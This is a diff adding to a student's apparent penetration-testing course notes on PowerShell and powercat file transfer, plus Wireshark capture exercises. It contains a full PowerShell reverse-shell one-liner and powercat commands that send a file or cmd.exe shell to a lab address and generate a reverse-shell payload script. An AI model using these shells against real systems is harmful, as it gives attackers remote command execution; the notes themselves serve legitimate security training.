@@ -167,3 +167,92 @@ on the following versions of Windows:
 
 ### Powershell file transfer
 
+```
+powershell -c "(new-object Sytem.Net.WebClient).DownloadFile('http:/127.0.0.1/index.html', 'index.html')"
+```
+
+powershell not working
+
+```
+ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('localhost',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
+$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
+ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
+).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
+lient.Close()"
+```
+
+```
+/usr/share/windows-resources/powercat/powercat.ps1 
+```
+
+powercat file transfer
+
+Although we could use any of the previously discussed tools to transfer Powercat to our target,
+let’s take a look at how to use powercat to transfer itself (powercat.ps1) from Bob to Alice as a way
+to demonstrate file transfers with powercat.
+
+` sudo nc -lnvp 443 > receiving_powercat.ps1`
+
+`powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1`
+
+`ls receiving_powercat.ps1`
+
+`powercat -c 10.11.0.4 -p 443 -e cmd.exe`
+
+By contrast, a powercat bind shell is started on Bob’s side with a powercat listener. We will use the
+-l option to create a listener, -p to specify the listening port number, and -e to have an application
+(cmd.exe) executed once connected
+
+After starting a listener on Alice’s machine, we create a stand-alone reverse shell payload by adding
+the -g option to the previous powercat command and redirecting the output to a file. This will
+produce a powershell script that Bob can execute on his machine
+
+`powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1`
+
+`Invoke-WebRequest 'google.com/index.html' -OutFile index.html`
+
+### 4.3.8.1 Exercises
+1. Use PowerShell and powercat to create a reverse shell from your Windows system to your
+Kali machine.
+
+`not done`
+
+2. Use PowerShell and powercat to create a bind shell on your Windows system and connect
+to it from your Kali machine. Can you also use powercat to connect to it locally?
+
+`not done`
+
+3. Use powercat to generate an encoded payload and then have it executed through
+powershell. Have a reverse shell sent to your Kali machine, also create an encoded bind
+shell on your Windows system and use your Kali machine to connect to it.
+
+`not done`
+
+## Wireshark
+
+`sudo wireshark`
+
+Capture Filters
+When Wireshark loads, we are presented with a basic window where we can select the network
+interface we want to monitor as well as set display and capture filters. As mentioned above, we can
+use capture filters to reduce the amount of captured traffic by discarding any traffic that does not
+match our filter and narrow our focus to the packets we wish to analyze. Be aware that any traffic
+excluded from a capture filter will be lost, so it is best to define broad capture filters if you are
+concerned about potentially losing data
+
+Display filters
+
+following tcp streams
+
+![](wireshark_traffic.png)
+
+### 4.4.5.1 Exercises
+1. Use Wireshark to capture network activity while attempting to connect to 10.11.1.217 on
+port 110 using Netcat, and then attempt to log into it.
+2. Read and understand the output. Where is the three-way handshake happening? Where is
+the connection closed?
+3. Follow the TCP stream to read the login attempt.
+4. Use the display filter to only monitor traffic on port 110.
+5. Run a new session, this time using the capture filter to only collect traffic on port 110.
+
